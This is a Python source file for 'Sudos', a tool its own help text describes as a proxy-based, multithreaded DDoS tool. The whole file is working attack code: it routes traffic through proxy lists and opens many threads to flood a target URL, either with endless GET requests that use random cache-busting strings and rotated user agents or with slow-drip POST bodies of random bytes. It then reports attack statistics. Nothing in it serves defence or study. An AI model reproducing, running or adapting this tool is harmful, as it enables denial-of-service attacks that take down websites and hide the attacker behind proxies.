#!/usr/bin/env python
#version: 2.5.4-beta

from collections import namedtuple

import threading
import argparse
import requests
import random
import atexit
import socket
import socks
import time
import sys
import ssl
import os

class COLORS(object):
    red = "\u001b[31;1m"
    green = "\u001b[32;1m"
    yellow = "\u001b[33;1m"
    blue = "\u001b[34;1m"
    purple = "\u001b[35;1m"
    cyan = "\u001b[36;1m"
    white = "\u001b[37;1m"
    reset = "\u001b[0;0m"

class Sudos(object):
    _hrs: int = 0
    _ups: int = 0
    _dps: int = 0
    _thrs: int = 0
    _tups: int = 0
    _tdps: int = 0
    _open_connections: int = 0
    _active_threads: int = 0
    _start_time: float = 0.0
    user_agents: list = None
    
    def __init__(self):
        self.max_threads: int = 100
        self.timeout: int = 5
        self.delay: int = 1
        self.receive_buffer: int = 65536
        
        self.anti_cache: bool = True
        self.receive_response: bool = False

    @staticmethod
    def split_url(url: str) -> namedtuple:
        try:
            url = url.strip()    
            
            try:
                protocol, url = url.split("://", 1)
            except ValueError:
                return
            
            try:
                domain, path = url.split("/", 1)
            except ValueError:
                domain = url
                path = ""
            
            try:
                domain, port = domain.split(":", 1)
            except ValueError:
                domain = domain
                port = 80
            
            try:
                path, parameters = path.split("?", 1)
            except ValueError:
                path = path
                parameters = None
            
            try:
                path, fragments = path.split("#", 1)
            except ValueError:
                path = path
                fragments = None
            
            path = f"/{path}"
            if protocol == "https":
                port = 443
            if parameters:
                parameters = f"?{parameters}"
            if fragments:
                fragments = f"#{fragments}"
            
            url_dict = {}
            url_dict["protocol"] = protocol
            url_dict["domain"] = domain
            url_dict["port"] = port
            url_dict["path"] = path
            url_dict["parameters"] = parameters
            url_dict["fragments"] = fragments
            
            url_struct = namedtuple("URLObject", "protocol domain port path parameters fragments")
            url_object = url_struct(**url_dict)
            
            return url_object
        except Exception:
            return

    @staticmethod
    def random_string(length: int) -> str:
        try:
            chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
            string = random.choices(list(chars), k=length)
            string = "".join(string)
            
            return string
        except Exception as e:
            print(f"random_string error: {e}")
            pass

    def random_user_agent(self) -> str:
        try:
            if not type(self.user_agents) == list:
                print("Unable to load useragents")
                sys.exit()
            return random.choice(self.user_agents)
        except Exception as e:
            print(f"random_user_agent error: {e}")
            pass

    def load_user_agent(self) -> None:
        try:
            if not os.path.exists("etc"):
                os.mkdir("etc")
            os.chdir("etc")
            if not os.path.exists("useragents.txt"):
                print(f"[+] Downloading useragents")
                http = requests.get("https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt")
                with open("useragents.txt", "w") as f:
                    f.write(http.text)
                    f.close()
            with open("useragents.txt") as f:
                self.user_agents = f.read().splitlines()
                f.close()
            os.chdir("..")
        except Exception as e:
            print(f"load_user_agent error: {e}")
            sys.exit()

    def http(self, url: str, **kwargs) -> None:
        try:
            self._active_threads += 1
            
            connected = False
            kwargs.setdefault("method", 1)
            methods = [1, 2]
            try:
                method = int(kwargs.get("method"))
            except Exception as e:
                return 1
            if not method in methods:
                return 1
            
            url = Sudos.split_url(url)
            if not url:
                return 2
            try:
                port = int(url.port)
            except Exception:
                return 2
            
            use_proxy = False
            if kwargs.get("proxy_protocol") or kwargs.get("proxy_host") or kwargs.get("proxy_port"):
                use_proxy = True
                if not (kwargs.get("proxy_protocol") and kwargs.get("proxy_host") and kwargs.get("proxy_port")):
                    return 3
                else:
                    proxy_protocol = kwargs.get("proxy_protocol")
                    proxy_host = kwargs.get("proxy_host")
                    proxy_port = kwargs.get("proxy_port")
                    
                    proxy_protocol = proxy_protocol.upper()
                    
                    try:
                        proxy_protocol = getattr(socks, f"PROXY_TYPE_{proxy_protocol}")
                    except Exception:
                        return 3
                    
                    try:
                        proxy_port = int(proxy_port)
                    except Exception:
                        return 3
            
            if use_proxy:
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                sock.set_proxy(proxy_protocol, proxy_host, proxy_port)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            try:
                timeout = int(self.timeout)
            except Exception:
                timeout = 5
            
            sock.connect((url.domain, port))
            if url.protocol == "https":
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock)
            connected = True
            self._open_connections += 1
            
            try:
                delay = int(self.delay)
            except Exception:
                delay = 1
            
            url_parameters = url.parameters
            fragments = url.fragments
            
            if url_parameters == None:
                url_parameters = ""
            if fragments == None:
                fragments = ""
            
            default_headers = {}
            default_headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            default_headers["Accept-Encoding"] = "gzip, deflate, br"
            default_headers["Accept-Language"] = "en-US,en;q=0.5"
            default_headers["Connection"] = "keep-alive"
            default_headers["DNT"] = "1"
            default_headers["Host"] = url.domain
            default_headers["Sec-GPC"] = "1"
            default_headers["TE"] = "Trailers"
            default_headers["Upgrade-Insecure-Requests"] = "1"
            
            default_headers_string = ""
            for header in default_headers:
                header_name = header
                header_value = default_headers[header_name]
                default_headers_string += f"{header_name}: {header_value}\r\n"
            
            if method == 1:
                while True:
                    if self.anti_cache:
                        randstr = Sudos.random_string(77)
                        parameters = f"?{randstr}&{url_parameters[1:]}"
                    else:
                        parameters = f"{url_parameters}"
                    full_path = f"{url.path}{parameters}{fragments}"
                    
                    user_agent = self.random_user_agent()
                    http = f"GET {full_path} HTTP/1.1\r\n{default_headers_string}User-Agent: {user_agent}\r\n\r\n"
                    
                    data = sock.send(http.encode())
                    self._hrs += 1
                    self._ups += data
                    self._thrs += 1
                    self._tups += data
                    
                    if self.receive_response:
                        sock.settimeout(1)
                        while True:
                            try:
                                data = sock.recv(self.receive_buffer)
                                if len(data) == 0:
                                    break
                                self._dps += len(data)
                                self._tdps += len(data)
                            except socket.timeout:
                                break
                        sock.settimeout(None)
                    
                    time.sleep(delay)
            elif method == 2:
                while True:
                    if self.anti_cache:
                        randstr = Sudos.random_string(77)
                        parameters = f"?{randstr}&{url_parameters[1:]}"
                    else:
                        parameters = f"{url_parameters}"
                    full_path = f"{url.path}{parameters}{fragments}"
                    
                    content = random._urandom(4096)
                    
                    user_agent = self.random_user_agent()
                    http = f"POST {full_path} HTTP/1.1\r\n{default_headers_string}User-Agent: {user_agent}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(content)}\r\n\r\n"
                    
                    data = sock.send(http.encode())
                    self._hrs += 1
                    self._ups += data
                    self._thrs += 1
                    self._tups += data
                    
                    for text in content:
                        text = str(text)
                        data = sock.send(text.encode())
                        self._ups += data
                        self._tups += data
                        time.sleep(delay)
        except Exception:
            pass
        finally:
            self._active_threads -= 1
            if connected:
                self._open_connections -= 1
                    
    def separate(self, length: int, string: str) -> str:
        return " " * (length - len(str(string)))
    
    def display_status(self) -> None:
        try:
            theme1 = COLORS.purple
            theme2 = COLORS.cyan
            time.sleep(1)
            while True:
                ups = self.bytecount(self._ups)
                dps = self.bytecount(self._dps)
                print(f"{theme1}T: {theme2}{self._active_threads}{self.separate(7, self._active_threads)}{theme1}C: {theme2}{self._open_connections}{self.separate(7, self._open_connections)}{theme1}H: {theme2}{self._hrs}{self.separate(10, self._hrs)}{theme1}U: {theme2}{ups}{self.separate(15, ups)}{theme1}D: {theme2}{dps}{COLORS.reset}")
                self._hrs = 0
                self._ups = 0
                self._dps = 0
                time.sleep(1)
        except Exception as e:
            print(f"display_status error: {e}")
            pass
    
    def bytecount(self, bytesize: int) -> str:
        try:
            if bytesize >= 1000000000000:
                total = bytesize / 1000000000000
                total = f"{total:.2f} TB"
            elif bytesize >= 1000000000:
                total = bytesize / 1000000000
                total = f"{total:.2f} GB"
            elif bytesize >= 1000000:
                total = bytesize / 1000000
                total = f"{total:.2f} MB"
            elif bytesize >= 1000:
                total = bytesize / 1000
                total = f"{total:.2f} kB"
            else:
                total = f"{bytesize:.2f} B"
            return total
        except Exception as e:
            print(f"bytecount error: {e}")
            pass
    
    def onexit(self) -> None:
        tups = self.bytecount(self._tups)
        tdps = self.bytecount(self._tdps)
        total_bandwidth = self.bytecount(self._tups + self._tdps)
        attack_duration = time.time() - self._start_time
        theme1 = COLORS.purple
        theme2 = COLORS.cyan
        theme3 = COLORS.blue
        print(f"\r\n\r\n{theme3}ATTACK STATISTICS\r\n{theme1}HTTP Request: {theme2}{self._thrs}\r\n{theme1}Upload Bandwidth: {theme2}{tups}\r\n{theme1}Download Bandwidth: {theme2}{tdps}\r\n\r\n{theme1}Total Bandwidth: {theme2}{total_bandwidth}\r\n{theme1}Attack Duration: {theme2}{attack_duration:.2f}{COLORS.reset}\r\n")
    
    def initialize(self) -> None:
        try:
            parser = argparse.ArgumentParser(description="Sudos, proxy-based, multithreaded DDOS tool")
            parser.add_argument("-t", "--threads", type=int, metavar="THREADS", help="Max threads value")
            parser.add_argument("-z", "--proxy-type", type=str, metavar="PROXY TYPE", help="Proxy type followed by the proxy list")
            parser.add_argument("-x", "--proxy-list", type=str, metavar="PROXY LIST", help="Proxy list path")
            parser.add_argument("-c", "--timeout", type=int, metavar="TIMEOUT", help="Connection timeout value")
            parser.add_argument("-v", "--delay", type=int, metavar="DELAY", help="HTTP request delay value")
            parser.add_argument("-n", "--receive", action="store_true", help="Enables receive HTTP response")
            parser.add_argument("-m", "--method", choices=["1", "2"], default=1, metavar="ATTACK METHOD", help="Attack method")
            parser.add_argument("url", nargs="?", type=str, metavar="URL", help="Target URL")
            args = parser.parse_args()
            
            if not args.url:
                print("[-] URL is required")
                parser.print_help()
                return
            
            if not Sudos.split_url(args.url):
                print("[-] Invalid URL Format. EXAMPLE: http://target.com/")
                return
            
            if args.proxy_type or args.proxy_list:
                if not args.proxy_type or not args.proxy_list:
                    print("[-] Proxy type and proxy list arguments are required when using proxy")
                    return
            
            if args.proxy_type:
                try:
                    proxy_protocol = args.proxy_type.upper()
                    getattr(socks, f"PROXY_TYPE_{proxy_protocol}")
                except Exception:
                    print("[-] Invalid proxy type. PROXY TYPES: HTTP, SOCKS4, SOCKS5")
                    return
            
            if args.proxy_list:
                try:
                    with open(args.proxy_list) as f:
                        proxies = f.read().splitlines()
                        f.close()
                except Exception:
                    print("[-] Invalid proxy list file")
                    return
            
            if args.threads != None:
                self.max_threads = args.threads
            if args.timeout != None:
                self.timeout = args.timeout
            if args.delay != None:
                self.delay = args.delay
            if args.receive:
                self.receive_response = True
            
            method = int(args.method)
            
            self.load_user_agent()
            atexit.register(self.onexit)
            threading.Thread(target=self.display_status, daemon=True).start()
            self._start_time = time.time()
            while True:
                for proxy in proxies:
                    proxy_host, proxy_port = proxy.split(":", 1)
                    kwargs = {}
                    kwargs["proxy_protocol"] = proxy_protocol
                    kwargs["proxy_host"] = proxy_host
                    kwargs["proxy_port"] = proxy_port
                    kwargs["method"] = method
                    while True:
                        if self._active_threads >= self.max_threads:
                            continue
                        threading.Thread(target=self.http, args=[args.url], kwargs=kwargs, daemon=True).start()
                        break
        except KeyboardInterrupt:
            sys.exit()
        except Exception as e:
            print(f"initialize error: {e}")
            pass

def main():
    sudos = Sudos()
    sudos.initialize()

if __name__ == "__main__":
    main()
